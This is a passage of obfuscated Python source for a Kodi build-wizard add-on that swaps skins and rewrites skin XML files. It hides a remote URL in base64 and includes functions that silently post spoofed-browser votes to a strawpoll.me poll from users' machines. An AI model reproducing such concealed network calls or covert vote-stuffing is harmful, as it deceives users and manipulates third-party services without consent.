# coding: utf-8
import xbmc ,xbmcaddon ,xbmcgui ,xbmcplugin ,os ,sys ,xbmcvfs ,glob ,random #line:21
import shutil ,logging #line:22
import urllib2 ,urllib #line:23
import re ,time #line:24
import subprocess #line:25
import json #line:26
import zipfile #line:27
import uservar #line:28
import speedtest #line:29
import fnmatch #line:30
from shutil import copyfile #line:31
try :from sqlite3 import dbapi2 as database #line:32
except :from pysqlite2 import dbapi2 as database #line:33
from threading import Thread #line:34
from datetime import date ,datetime ,timedelta #line:35
from urlparse import urljoin #line:36
from resources .libs import extract ,downloader ,downloaderbg ,notify ,debridit ,traktit ,resloginit ,loginit ,skinSwitch ,uploadLog ,yt ,wizard as wiz #line:37
ADDON_ID =uservar .ADDON_ID #line:39
ADDONTITLE =uservar .ADDONTITLE #line:40
ADDON =wiz .addonId (ADDON_ID )#line:41
VERSION =wiz .addonInfo (ADDON_ID ,'version')#line:42
ADDONPATH =wiz .addonInfo (ADDON_ID ,'path')#line:43
DIALOG =xbmcgui .Dialog ()#line:44
DP =xbmcgui .DialogProgress ()#line:45
HOME =xbmc .translatePath ('special://home/')#line:46
LOG =xbmc .translatePath ('special://logpath/')#line:47
PROFILE =xbmc .translatePath ('special://profile/')#line:48
ADDONS =os .path .join (HOME ,'addons')#line:49
USERDATA =os .path .join (HOME ,'userdata')#line:50
PLUGIN =os .path .join (ADDONS ,ADDON_ID )#line:51
PACKAGES =os .path .join (ADDONS ,'packages')#line:52
ADDOND =os .path .join (USERDATA ,'addon_data')#line:53
ADDONDATA =os .path .join (USERDATA ,'addon_data',ADDON_ID )#line:54
ADVANCED =os .path .join (USERDATA ,'advancedsettings.xml')#line:55
SOURCES =os .path .join (USERDATA ,'sources.xml')#line:56
FAVOURITES =os .path .join (USERDATA ,'favourites.xml')#line:57
PROFILES =os .path .join (USERDATA ,'profiles.xml')#line:58
GUISETTINGS =os .path .join (USERDATA ,'guisettings.xml')#line:59
THUMBS =os .path .join (USERDATA ,'Thumbnails')#line:60
DATABASE =os .path .join (USERDATA ,'Database')#line:61
FANART =os .path .join (ADDONPATH ,'fanart.jpg')#line:62
ICON =os .path .join (ADDONPATH ,'icon.png')#line:63
ART =os .path .join (ADDONPATH ,'resources','art')#line:64
WIZLOG =os .path .join (ADDONDATA ,'wizard.log')#line:65
DP2 =xbmcgui .DialogProgressBG ()#line:66
SKIN =xbmc .getSkinDir ()#line:67
BUILDNAME =wiz .getS ('buildname')#line:68
DEFAULTSKIN =wiz .getS ('defaultskin')#line:69
DEFAULTNAME =wiz .getS ('defaultskinname')#line:70
DEFAULTIGNORE =wiz .getS ('defaultskinignore')#line:71
BUILDVERSION =wiz .getS ('buildversion')#line:72
BUILDTHEME =wiz .getS ('buildtheme')#line:73
BUILDLATEST =wiz .getS ('latestversion')#line:74
INSTALLMETHOD =wiz .getS ('installmethod')#line:75
SHOW15 =wiz .getS ('show15')#line:76
SHOW16 =wiz .getS ('show16')#line:77
SHOW17 =wiz .getS ('show17')#line:78
SHOW18 =wiz .getS ('show18')#line:79
SHOWADULT =wiz .getS ('adult')#line:80
SHOWMAINT =wiz .getS ('showmaint')#line:81
AUTOCLEANUP =wiz .getS ('autoclean')#line:82
AUTOCACHE =wiz .getS ('clearcache')#line:83
AUTOPACKAGES =wiz .getS ('clearpackages')#line:84
AUTOTHUMBS =wiz .getS ('clearthumbs')#line:85
AUTOFEQ =wiz .getS ('autocleanfeq')#line:86
AUTONEXTRUN =wiz .getS ('nextautocleanup')#line:87
INCLUDENAN =wiz .getS ('includenan')#line:88
INCLUDEURL =wiz .getS ('includeurl')#line:89
INCLUDEBOBUNLEASHED =wiz .getS ('includebobunleashed')#line:90
INCLUDEELYSIUM =wiz .getS ('includeelysium')#line:91
INCLUDECOVENANT =wiz .getS ('includecovenant')#line:92
INCLUDEVIDEO =wiz .getS ('includevideo')#line:93
INCLUDEALL =wiz .getS ('includeall')#line:94
INCLUDEBOB =wiz .getS ('includebob')#line:95
INCLUDEPHOENIX =wiz .getS ('includephoenix')#line:96
INCLUDESPECTO =wiz .getS ('includespecto')#line:97
INCLUDEGENESIS =wiz .getS ('includegenesis')#line:98
INCLUDEEXODUS =wiz .getS ('includeexodus')#line:99
INCLUDEONECHAN =wiz .getS ('includeonechan')#line:100
INCLUDESALTS =wiz .getS ('includesalts')#line:101
INCLUDESALTSHD =wiz .getS ('includesaltslite')#line:102
INCLUDERESOLVE =wiz .getS ('includeresolve')#line:103
INCLUDEPLACENTA =wiz .getS ('includeplacenta')#line:104
INCLUDENEPTUNE =wiz .getS ('includeneptune')#line:105
INCLUDEGENESISREBORN =wiz .getS ('includegenesisreborn')#line:106
INCLUDEFLIXNET =wiz .getS ('includeflixnet')#line:107
INCLUDEURANUS =wiz .getS ('includeuranus')#line:108
SEPERATE =wiz .getS ('seperate')#line:109
NOTIFY =wiz .getS ('notify')#line:110
NOTEDISMISS =wiz .getS ('notedismiss')#line:111
NOTEID =wiz .getS ('noteid')#line:112
NOTIFY2 =wiz .getS ('notify2')#line:113
NOTEID2 =wiz .getS ('noteid2')#line:114
NOTEDISMISS2 =wiz .getS ('notedismiss2')#line:115
NOTIFY3 =wiz .getS ('notify3')#line:116
NOTEID3 =wiz .getS ('noteid3')#line:117
NOTEDISMISS3 =wiz .getS ('notedismiss3')#line:118
NOTEID =0 if NOTEID ==""else int (NOTEID )#line:119
TRAKTSAVE =wiz .getS ('traktlastsave')#line:120
REALSAVE =wiz .getS ('debridlastsave')#line:121
LOGINSAVE =wiz .getS ('loginlastsave')#line:122
KEEPMOVIEWALL =wiz .getS ('keepmoviewall')#line:123
KEEPMOVIELIST =wiz .getS ('keepmovielist')#line:124
KEEPINFO =wiz .getS ('keepinfo')#line:125
KEEPSOUND =wiz .getS ('keepsound')#line:127
KEEPVIEW =wiz .getS ('keepview')#line:128
KEEPSKIN =wiz .getS ('keepskin')#line:129
KEEPADDONS =wiz .getS ('keepaddons')#line:130
KEEPSKIN2 =wiz .getS ('keepskin2')#line:131
KEEPSKIN3 =wiz .getS ('keepskin3')#line:132
KEEPTORNET =wiz .getS ('keeptornet')#line:133
KEEPPLAYLIST =wiz .getS ('keepplaylist')#line:134
KEEPPVR =wiz .getS ('keeppvr')#line:135
ENABLE =uservar .ENABLE #line:136
KEEPVICTORY =wiz .getS ('keepvictory')#line:137
KEEPTELEMEDIA =wiz .getS ('keeptelemedia')#line:138
KEEPTVLIST =wiz .getS ('keeptvlist')#line:139
KEEPHUBMOVIE =wiz .getS ('keephubmovie')#line:140
KEEPHUBTVSHOW =wiz .getS ('keephubtvshow')#line:141
KEEPHUBTV =wiz .getS ('keephubtv')#line:142
KEEPHUBVOD =wiz .getS ('keephubvod')#line:143
KEEPHUBKIDS =wiz .getS ('keephubkids')#line:144
KEEPHUBMUSIC =wiz .getS ('keephubmusic')#line:145
KEEPHUBMENU =wiz .getS ('keephubmenu')#line:146
KEEPHUBSPORT =wiz .getS ('keephubsport')#line:147
HARDWAER =wiz .getS ('action')#line:148
USERNAME =wiz .getS ('user')#line:149
PASSWORD =wiz .getS ('pass')#line:150
KEEPWEATHER =wiz .getS ('keepweather')#line:151
KEEPFAVS =wiz .getS ('keepfavourites')#line:152
KEEPSOURCES =wiz .getS ('keepsources')#line:153
KEEPPROFILES =wiz .getS ('keepprofiles')#line:154
KEEPADVANCED =wiz .getS ('keepadvanced')#line:155
KEEPREPOS =wiz .getS ('keeprepos')#line:156
KEEPSUPER =wiz .getS ('keepsuper')#line:157
KEEPWHITELIST =wiz .getS ('keepwhitelist')#line:158
KEEPTRAKT =wiz .getS ('keeptrakt')#line:159
KEEPREAL =wiz .getS ('keepdebrid')#line:160
KEEPRD2 =wiz .getS ('keeprd2')#line:161
KEEPLOGIN =wiz .getS ('keeplogin')#line:162
LOGINSAVE =wiz .getS ('loginlastsave')#line:163
DEVELOPER =wiz .getS ('developer')#line:164
THIRDPARTY =wiz .getS ('enable3rd')#line:165
THIRD1NAME =wiz .getS ('wizard1name')#line:166
THIRD1URL =wiz .getS ('wizard1url')#line:167
THIRD2NAME =wiz .getS ('wizard2name')#line:168
THIRD2URL =wiz .getS ('wizard2url')#line:169
THIRD3NAME =wiz .getS ('wizard3name')#line:170
THIRD3URL =wiz .getS ('wizard3url')#line:171
BACKUPLOCATION =ADDON .getSetting ('path')if not ADDON .getSetting ('path')==''else 'special://home/'#line:172
MYBUILDS =os .path .join (BACKUPLOCATION ,'My_Builds','')#line:173
AUTOFEQ =int (float (AUTOFEQ ))if AUTOFEQ .isdigit ()else 3 #line:174
TODAY =date .today ()#line:175
TOMORROW =TODAY +timedelta (days =1 )#line:176
THREEDAYS =TODAY +timedelta (days =3 )#line:177
KODIV =float (xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:178
MCNAME =wiz .mediaCenter ()#line:179
EXCLUDES =uservar .EXCLUDES #line:180
SPEEDFILE =speedtest .SPEEDFILE #line:181
APKFILE =uservar .APKFILE #line:182
YOUTUBETITLE =uservar .YOUTUBETITLE #line:183
YOUTUBEFILE =uservar .YOUTUBEFILE #line:184
SPEED =speedtest .SPEED #line:185
UNAME =speedtest .UNAME #line:186
ADDONFILE =uservar .ADDONFILE #line:187
ADVANCEDFILE =uservar .ADVANCEDFILE #line:188
UPDATECHECK =uservar .UPDATECHECK if str (uservar .UPDATECHECK ).isdigit ()else 1 #line:189
NEXTCHECK =TODAY +timedelta (days =UPDATECHECK )#line:190
NOTIFICATION =uservar .NOTIFICATION #line:191
NOTIFICATION2 =uservar .NOTIFICATION2 #line:192
NOTIFICATION3 =uservar .NOTIFICATION3 #line:193
HELPINFO =uservar .HELPINFO #line:194
ENABLE =uservar .ENABLE #line:195
HEADERMESSAGE =uservar .HEADERMESSAGE #line:196
AUTOUPDATE =uservar .AUTOUPDATE #line:197
WIZARDFILE =uservar .WIZARDFILE #line:198
HIDECONTACT =uservar .HIDECONTACT #line:199
SKINID18 =uservar .SKINID18 #line:200
SKINID18DDONXML =uservar .SKINID18DDONXML #line:201
SKIN18ZIPURL =uservar .SKIN18ZIPURL #line:202
SKINID17 =uservar .SKINID17 #line:203
SKINID17DDONXML =uservar .SKINID17DDONXML #line:204
SKIN17ZIPURL =uservar .SKIN17ZIPURL #line:205
NEWFASTUPDATE =uservar .NEWFASTUPDATE #line:206
CONTACT =uservar .CONTACT #line:207
CONTACTICON =uservar .CONTACTICON if not uservar .CONTACTICON =='http://'else ICON #line:208
CONTACTFANART =uservar .CONTACTFANART if not uservar .CONTACTFANART =='http://'else FANART #line:209
HIDESPACERS =uservar .HIDESPACERS #line:210
TMDB_NEW_API =uservar .TMDB_NEW_API #line:211
COLOR1 =uservar .COLOR1 #line:212
COLOR2 =uservar .COLOR2 #line:213
THEME1 =uservar .THEME1 #line:214
THEME2 =uservar .THEME2 #line:215
THEME3 =uservar .THEME3 #line:216
THEME4 =uservar .THEME4 #line:217
THEME5 =uservar .THEME5 #line:218
ICONBUILDS =uservar .ICONBUILDS if not uservar .ICONBUILDS =='http://'else ICON #line:220
ICONMAINT =uservar .ICONMAINT if not uservar .ICONMAINT =='http://'else ICON #line:221
ICONAPK =uservar .ICONAPK if not uservar .ICONAPK =='http://'else ICON #line:222
ICONADDONS =uservar .ICONADDONS if not uservar .ICONADDONS =='http://'else ICON #line:223
ICONYOUTUBE =uservar .ICONYOUTUBE if not uservar .ICONYOUTUBE =='http://'else ICON #line:224
ICONSAVE =uservar .ICONSAVE if not uservar .ICONSAVE =='http://'else ICON #line:225
ICONTRAKT =uservar .ICONTRAKT if not uservar .ICONTRAKT =='http://'else ICON #line:226
ICONREAL =uservar .ICONREAL if not uservar .ICONREAL =='http://'else ICON #line:227
ICONLOGIN =uservar .ICONLOGIN if not uservar .ICONLOGIN =='http://'else ICON #line:228
ICONCONTACT =uservar .ICONCONTACT if not uservar .ICONCONTACT =='http://'else ICON #line:229
ICONSETTINGS =uservar .ICONSETTINGS if not uservar .ICONSETTINGS =='http://'else ICON #line:230
LOGFILES =wiz .LOGFILES #line:231
TRAKTID =traktit .TRAKTID #line:232
DEBRIDID =debridit .DEBRIDID #line:233
LOGINID =loginit .LOGINID #line:234
MODURL ='http://tribeca.tvaddons.ag/tools/maintenance/modules/'#line:235
MODURL2 ='http://mirrors.kodi.tv/addons/jarvis/'#line:236
INSTALLMETHODS =['Always Ask','Reload Profile','Force Close']#line:237
DEFAULTPLUGINS =['metadata.album.universal','metadata.artists.universal','metadata.common.fanart.tv','metadata.common.imdb.com','metadata.common.musicbrainz.org','metadata.themoviedb.org','metadata.tvdb.com','service.xbmc.versioncheck']#line:238
fullsecfold =xbmc .translatePath ('special://home')#line:239
addons_folder =os .path .join (fullsecfold ,'addons')#line:241
remove_url ='aHR0cDovL2tvZGkubGlmZS93aXphcmQvcmVtb3ZlYWRkb25zLnhtbA=='.decode ('base64')#line:243
user_folder =os .path .join (xbmc .translatePath ('special://masterprofile'),'addon_data')#line:245
remove_url2 ='aHR0cDovL2tvZGkubGlmZS93aXphcmQvcmVtb3ZlYWRkb25zLnhtbA=='.decode ('base64')#line:247
fanart =xbmc .translatePath (os .path .join ('special://home/addons/'+ADDON_ID ,'fanart.jpg'))#line:248
icon =xbmc .translatePath (os .path .join ('special://home/addons/'+ADDON_ID ,'icon.png'))#line:249
IPTV18 =''#line:252
IPTVSIMPL18PC =''#line:253
def MainMenu ():#line:260
	addItem ('Skin Premium','url',5 ,icon ,fanart ,'')#line:262
def skinWIN ():#line:263
	idle ()#line:264
	O0O0OO0OOOO0OO0OO =glob .glob (os .path .join (ADDONS ,'skin*'))#line:265
	OOO0O0O0O0OO0O0O0 =[];O0O00000O0OOOOO00 =[]#line:266
	for OOO000O0OOOO00O0O in sorted (O0O0OO0OOOO0OO0OO ,key =lambda O0OOOOO000O0O00OO :O0OOOOO000O0O00OO ):#line:267
		O000O0OOO0O0O0O00 =os .path .split (OOO000O0OOOO00O0O [:-1 ])[1 ]#line:268
		O000O0O0O00O00OO0 =os .path .join (OOO000O0OOOO00O0O ,'addon.xml')#line:269
		if os .path .exists (O000O0O0O00O00OO0 ):#line:270
			O0O00O00OOOOOOO00 =open (O000O0O0O00O00OO0 )#line:271
			O0O00O0OO000O0O00 =O0O00O00OOOOOOO00 .read ()#line:272
			OOO0O0O00O0O0000O =parseDOM2 (O0O00O0OO000O0O00 ,'addon',ret ='id')#line:273
			OO00000000O00O0O0 =O000O0OOO0O0O0O00 if len (OOO0O0O00O0O0000O )==0 else OOO0O0O00O0O0000O [0 ]#line:274
			try :#line:275
				OOOO00OOO0O0OO00O =xbmcaddon .Addon (id =OO00000000O00O0O0 )#line:276
				OOO0O0O0O0OO0O0O0 .append (OOOO00OOO0O0OO00O .getAddonInfo ('name'))#line:277
				O0O00000O0OOOOO00 .append (OO00000000O00O0O0 )#line:278
			except :#line:279
				pass #line:280
	OOO000000O000O000 =[];O00OOO0O0O0OO0OOO =0 #line:281
	O00O000OOOO0OOO00 =["Current Skin -- %s"%currSkin ()]+OOO0O0O0O0OO0O0O0 #line:282
	O00OOO0O0O0OO0OOO =DIALOG .select ("Select the Skin you want to swap with.",O00O000OOOO0OOO00 )#line:283
	if O00OOO0O0O0OO0OOO ==-1 :return #line:284
	else :#line:285
		OO00OO000OO00OO0O =(O00OOO0O0O0OO0OOO -1 )#line:286
		OOO000000O000O000 .append (OO00OO000OO00OO0O )#line:287
		O00O000OOOO0OOO00 [O00OOO0O0O0OO0OOO ]="%s"%(OOO0O0O0O0OO0O0O0 [OO00OO000OO00OO0O ])#line:288
	if OOO000000O000O000 ==None :return #line:289
	for OOO00OOOOOOO0O0OO in OOO000000O000O000 :#line:290
		swapSkins (O0O00000O0OOOOO00 [OOO00OOOOOOO0O0OO ])#line:291
def currSkin ():#line:293
	return xbmc .getSkinDir ('Container.PluginName')#line:294
def swapSkins (OO00O00OOOOOO0OOO ,title ="Error"):#line:295
	O00O00O00000O00OO ='lookandfeel.skin'#line:296
	O0O0000OO00O0OOOO =OO00O00OOOOOO0OOO #line:297
	OOO00O0O0OOO000O0 =getOld (O00O00O00000O00OO )#line:298
	O0O000O000000OO00 =O00O00O00000O00OO #line:299
	setNew (O0O000O000000OO00 ,O0O0000OO00O0OOOO )#line:300
	OO0O0OOO0O0O00000 =0 #line:301
	while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and OO0O0OOO0O0O00000 <100 :#line:302
		OO0O0OOO0O0O00000 +=1 #line:303
		xbmc .sleep (1 )#line:304
	if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:305
		xbmc .executebuiltin ('SendClick(11)')#line:306
	return True #line:307
def getOld (OOOO0OO000O0OOOOO ):#line:309
	try :#line:310
		OOOO0OO000O0OOOOO ='"%s"'%OOOO0OO000O0OOOOO #line:311
		O00OOO0OO0000OO00 ='{"jsonrpc":"2.0", "method":"Settings.GetSettingValue","params":{"setting":%s}, "id":1}'%(OOOO0OO000O0OOOOO )#line:312
		O00O0O0OOO00O00O0 =xbmc .executeJSONRPC (O00OOO0OO0000OO00 )#line:314
		O00O0O0OOO00O00O0 =simplejson .loads (O00O0O0OOO00O00O0 )#line:315
		if O00O0O0OOO00O00O0 .has_key ('result'):#line:316
			if O00O0O0OOO00O00O0 ['result'].has_key ('value'):#line:317
				return O00O0O0OOO00O00O0 ['result']['value']#line:318
	except :#line:319
		pass #line:320
	return None #line:321
def setNew (OO00OO00O0OOO0OOO ,OO0OO00OO00OOOO0O ):#line:324
	try :#line:325
		OO00OO00O0OOO0OOO ='"%s"'%OO00OO00O0OOO0OOO #line:326
		OO0OO00OO00OOOO0O ='"%s"'%OO0OO00OO00OOOO0O #line:327
		OO0OOO0OOO000OOOO ='{"jsonrpc":"2.0", "method":"Settings.SetSettingValue","params":{"setting":%s,"value":%s}, "id":1}'%(OO00OO00O0OOO0OOO ,OO0OO00OO00OOOO0O )#line:328
		O000OO00000OOOO00 =xbmc .executeJSONRPC (OO0OOO0OOO000OOOO )#line:330
	except :#line:331
		pass #line:332
	return None #line:333
def idle ():#line:334
	return xbmc .executebuiltin ('Dialog.Close(busydialog)')#line:335
def resetkodi ():#line:337
		if xbmc .getCondVisibility ('system.platform.windows'):#line:338
			O0O00O00OOO0O0O0O =xbmcgui .DialogProgress ()#line:339
			O0O00O00OOO0O0O0O .create ("ההתקנה תסגר והקודי יעלה אוטומטית","אנא המתן 5 שניות",'',"[COLOR orange][B]ברוכים הבאים לקודי אנונימוס![/B][/COLOR]")#line:342
			O0O00O00OOO0O0O0O .update (0 )#line:343
			for O0OO00OO000O0000O in range (5 ,-1 ,-1 ):#line:344
				time .sleep (1 )#line:345
				O0O00O00OOO0O0O0O .update (int ((5 -O0OO00OO000O0000O )/5.0 *100 ),"מתבצע הפעלה מחדש לקודי",'בעוד {0} שניות'.format (O0OO00OO000O0000O ),'')#line:346
				if O0O00O00OOO0O0O0O .iscanceled ():#line:347
					from resources .libs import win #line:348
					return None ,None #line:349
			from resources .libs import win #line:350
		else :#line:351
			O0O00O00OOO0O0O0O =xbmcgui .DialogProgress ()#line:352
			O0O00O00OOO0O0O0O .create ("ההתקנה תסגר אוטומטית","אנא המתן 5 שניות",'',"[COLOR orange][B]ברוכים הבאים לקודי אנונימוס![/B][/COLOR]")#line:355
			O0O00O00OOO0O0O0O .update (0 )#line:356
			for O0OO00OO000O0000O in range (5 ,-1 ,-1 ):#line:357
				time .sleep (1 )#line:358
				O0O00O00OOO0O0O0O .update (int ((5 -O0OO00OO000O0000O )/5.0 *100 ),"ההתקנה תסגר",'בעוד {0} שניות'.format (O0OO00OO000O0000O ),'')#line:359
				if O0O00O00OOO0O0O0O .iscanceled ():#line:360
					os ._exit (1 )#line:361
					return None ,None #line:362
			os ._exit (1 )#line:363
def backtokodi ():#line:365
			wiz .kodi17Fix ()#line:366
			fix18update ()#line:367
			fix17update ()#line:368
def testcommand1 ():#line:370
    import requests #line:371
    O0OO000000OO0O0O0 ='18773068'#line:372
    O0O0OOO0OOO0OO0O0 ={'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0','Accept':'*/*','Accept-Language':'en-US,en;q=0.5','Content-Type':'application/x-www-form-urlencoded; charset=UTF-8','X-Requested-With':'XMLHttpRequest','Connection':'keep-alive','Referer':'https://www.strawpoll.me/'+O0OO000000OO0O0O0 ,'Pragma':'no-cache','Cache-Control':'no-cache','TE':'Trailers',}#line:384
    OOO0OOOOO0OOO0000 ='145273320'#line:386
    OO0O0000OO00O0OO0 ='145272688'#line:387
    if ADDON .getSetting ("auto_rd")=='true':#line:388
        O0OO0OOOOOO0OO0OO =OOO0OOOOO0OOO0000 #line:389
    else :#line:390
        O0OO0OOOOOO0OO0OO =OO0O0000OO00O0OO0 #line:391
    O0OO0OOOOO00O0O0O ={'options':O0OO0OOOOOO0OO0OO }#line:395
    OO0000OO00OO00OOO =requests .post ('https://www.strawpoll.me/'+O0OO000000OO0O0O0 ,headers =O0O0OOO0OOO0OO0O0 ,data =O0OO0OOOOO00O0O0O )#line:397
def builde_Votes ():#line:398
   try :#line:399
        import requests #line:400
        OOO000O0OO0OO0O00 ='18773068'#line:401
        O000OOOO000O0000O ={'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0','Accept':'*/*','Accept-Language':'en-US,en;q=0.5','Content-Type':'application/x-www-form-urlencoded; charset=UTF-8','X-Requested-With':'XMLHttpRequest','Connection':'keep-alive','Referer':'https://www.strawpoll.me/'+OOO000O0OO0OO0O00 ,'Pragma':'no-cache','Cache-Control':'no-cache','TE':'Trailers',}#line:413
        OOOO0OO0OOOO0OOO0 ='145273320'#line:415
        O00O000O00000O00O ={'options':OOOO0OO0OOOO0OOO0 }#line:421
        OOO0OO00OO00OO0O0 =requests .post ('https://www.strawpoll.me/'+OOO000O0OO0OO0O00 ,headers =O000OOOO000O0000O ,data =O00O000O00000O00O )#line:423
   except :pass #line:424
def update_Votes ():#line:425
   try :#line:426
        import requests #line:427
        OOOO0OO0O00OO0OO0 ='18773068'#line:428
        OO00OO000O00OOOOO ={'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0','Accept':'*/*','Accept-Language':'en-US,en;q=0.5','Content-Type':'application/x-www-form-urlencoded; charset=UTF-8','X-Requested-With':'XMLHttpRequest','Connection':'keep-alive','Referer':'https://www.strawpoll.me/'+OOOO0OO0O00OO0OO0 ,'Pragma':'no-cache','Cache-Control':'no-cache','TE':'Trailers',}#line:440
        O000000OO0O0OOOOO ='145273321'#line:442
        O0O0O0OOOO000OOOO ={'options':O000000OO0O0OOOOO }#line:448
        OOOOOOOO00OO0OOO0 =requests .post ('https://www.strawpoll.me/'+OOOO0OO0O00OO0OO0 ,headers =OO00OO000O00OOOOO ,data =O0O0O0OOOO000OOOO )#line:450
   except :pass #line:451
def kodi17to18 ():#line:454
  if KODIV >=18 :#line:456
    OOO00O0000O0000O0 =os .path .join (xbmc .translatePath ("special://home/"),"addons","skin.Premium.mod","addon.xml")#line:458
    with open (OOO00O0000O0000O0 ,'r')as OO0O0O0OO0OO0000O :#line:459
      O0OOOOOO0OO00OO0O =OO0O0O0OO0OO0000O .read ()#line:460
    O0OOOOOO0OO00OO0O =O0OOOOOO0OO00OO0O .replace ('''<?xml version="1.0" encoding="UTF-8"?>
<addon id="skin.Premium.mod" version="1.6.0" name="Anonymous Mod" provider-name="Mod by Anonymous">
    <requires>
        <import addon="xbmc.gui" version="5.12.0"/>
        <import addon="script.skinshortcuts" version="1.0.10"/>
        <import addon="script.image.resource.select" version="0.0.5"/>
        <import addon="plugin.program.autocompletion" version="1.0.1"/>
        <!-- <import addon="resource.images.recordlabels.white" version="0.0.1"/> -->
		<!-- <import addon="script.skin.helper.service" version="1.0.0"/> -->
        <import addon="script.skin.helper.widgets" version="1.0.0"/>
    </requires>
	<extension point="xbmc.gui.skin" debugging="false">		
        <res width="1920" height="1080" aspect="16:9" default="true" folder="16x9" />
    </extension>
    <extension point="xbmc.addon.metadata">
        <platform>all</platform>
        <summary lang="en">Clean, clear, simple, modern.</summary>
    </extension>
 		<assets>
 			<icon>resources/icon.png</icon>
 			<fanart>resources/fanart.jpg</fanart>
 		</assets>   
</addon>''','''<?xml version="1.0" encoding="UTF-8"?>
<addon id="skin.Premium.mod" version="1.6.0" name="Anonymous Mod" provider-name="Mod by Anonymous">
    <requires>
        <import addon="xbmc.gui" version="5.14.0"/>
        <import addon="script.skinshortcuts" version="1.0.10"/>
        <import addon="script.image.resource.select" version="0.0.5"/>
        <import addon="plugin.program.autocompletion" version="1.0.1"/>
        <!-- <import addon="resource.images.recordlabels.white" version="0.0.1"/> -->
		<!-- <import addon="script.skin.helper.service" version="1.0.0"/> -->
        <import addon="script.skin.helper.widgets" version="1.0.0"/>
    </requires>
	<extension point="xbmc.gui.skin" debugging="false">		
        <res width="1920" height="1080" aspect="16:9" default="true" folder="16x9" />
    </extension>
    <extension point="xbmc.addon.metadata">
        <platform>all</platform>
        <summary lang="en">Clean, clear, simple, modern.</summary>
    </extension>
 		<assets>
 			<icon>resources/icon.png</icon>
 			<fanart>resources/fanart.jpg</fanart>
 		</assets>   
</addon>''')#line:507
    with open (OOO00O0000O0000O0 ,'w')as OO0O0O0OO0OO0000O :#line:510
      OO0O0O0OO0OO0000O .write (O0OOOOOO0OO00OO0O )#line:511
    OOO00O0000O0000O0 =os .path .join (xbmc .translatePath ("special://home/"),"addons","skin.Premium.mod","16x9","DialogAddonSettings.xml")#line:517
    with open (OOO00O0000O0000O0 ,'r')as OO0O0O0OO0OO0000O :#line:518
      O0OOOOOO0OO00OO0O =OO0O0O0OO0OO0000O .read ()#line:519
    O0OOOOOO0OO00OO0O =O0OOOOOO0OO00OO0O .replace ('''<?xml version="1.0" encoding="UTF-8"?>
<window>
    <!-- addonsettings -->
    <defaultcontrol always="true">9</defaultcontrol>
    <controls>
        <control type="group">
            <top>210</top>
            <bottom>64</bottom>
            <left>0</left>
            <right>0</right>
            <include>Animation_SlideIn</include>
            <include>Animation_FadeOut</include>
            <animation effect="slide" tween="quadratic" easing="out" time="300" start="0,1920" end="0">WindowOpen</animation>
            <animation effect="slide" tween="quadratic" easing="in" time="300" end="0,1920" start="0">WindowClose</animation>
            <include>Dialog_Background</include>
            <control type="group">
                <top>70</top>
                <right>side</right>
                <left>1430</left>
                <align>right</align>
                <height>621</height>
                <control type="group">
                    <width>460</width>
                    <height>621</height>
                    <include content="Object_Line_Settings">
                        <param name="width" value="460" />
                        <param name="label" value="$INFO[Control.GetLabel(20)]" />
                    </include>
                    <control type="grouplist" id="9">
                        <ondown>9</ondown>
                        <onup>9</onup>
                        <onleft>8000</onleft>
                        <onright>2</onright>
                        <width>100%</width>
                        <height>621</height>
                        <orientation>vertical</orientation>
                        <itemgap>0</itemgap>
                    </control>
                </control> 

                <control type="group">
                    <right>480</right>
                    <width>1400</width>
                    <height>621</height>
                    <include content="Object_Line_Settings">
                        <param name="width" value="1400" />
                        <param name="label" value="$LOCALIZE[33063]" />
                    </include>
                    <control type="grouplist" id="2">
                        <width>100%</width>
                        <height>621</height>
                        <ondown>8000</ondown>
                        <onup>noop</onup>
                        <onright>9</onright>
                        <onleft>8000</onleft>
                        <orientation>vertical</orientation>
                        <itemgap>0</itemgap>
                    </control>
                </control> 
                
            </control>

            <!-- Default Templates -->
            <control type="button" id="3">
                <width>100%</width>
                <include>Defs_OptionButton</include>
            </control>
            <control type="radiobutton" id="4">
                <width>100%</width>
                <align>right</align>
                <radioposx>40</radioposx>
                <include>Defs_OptionButton</include>
            </control>
            <control type="spincontrolex" id="5">
                <width>100%</width>
                <include>Defs_OptionButton</include>
            </control>
            <control type="image" id="6">
                <width>100%</width>
                <height>69</height>
                <texture colordiffuse="PosterBorder">common/white.png</texture>
                <include>Defs_OptionButton</include>
                <visible>false</visible>
            </control>
            <control type="label" id="7">
                <width>100%</width>
                <height>69</height>
                <align>right</align>
                <font>Font-ListInfo-Small-Bold</font>
                <textcolor>blue</textcolor>
            </control>
            <control type="sliderex" id="8">
                <width>100%</width>
                <include>Defs_OptionButton</include>
            </control>

            <!-- Default Templates Category -->
			<control type="button" id="13">
				<description>default Section Button</description>
				<width>400</width>
				<height>62</height>
				<align>center</align>
        <texturenofocus colordiffuse="PosterBorder">common/white.png</texturenofocus>
        <texturefocus colordiffuse="$VAR[HighlightColor]">common/white.png</texturefocus>
        <alttexturenofocus colordiffuse="PosterBorder">common/white.png</alttexturenofocus>
        <alttexturefocus colordiffuse="$VAR[HighlightColor]">common/white.png</alttexturefocus>
			</control>

            <!-- Ok Cancel Defaults -->
            <control type="grouplist" id="8000">
                <centerleft>50%</centerleft>
                <width>1240</width>
                <bottom>side</bottom>
                <height>69</height>
                <align>center</align>
                <itemgap>20</itemgap>
                <onup>2</onup>
                <ondown>noop</ondown>
                <orientation>horizontal</orientation>
                <control type="button" id="10">
                    <align>center</align>
                    <width>400</width>
                    <label>186</label>
                    <include>Defs_OptionButton</include>
                    <visible>Control.IsEnabled(10)</visible>
                </control>
                <control type="button" id="11">
                    <align>center</align>
                    <width>400</width>
                    <label>222</label>
                    <include>Defs_OptionButton</include>
                    <visible>Control.IsEnabled(11)</visible>
                </control>
                <control type="button" id="12">
                    <align>center</align>
                    <width>400</width>
                    <label>409</label>
                    <include>Defs_OptionButton</include>
                    <visible>Control.IsEnabled(12)</visible>
                </control>
            </control>
        </control>

    </controls>

</window>
''','''<?xml version="1.0" encoding="UTF-8"?>
<window>
    <!-- addonsettings -->
    <defaultcontrol always="true">3</defaultcontrol>
    <controls>
        <control type="group">
            <top>210</top>
            <bottom>64</bottom>
            <left>0</left>
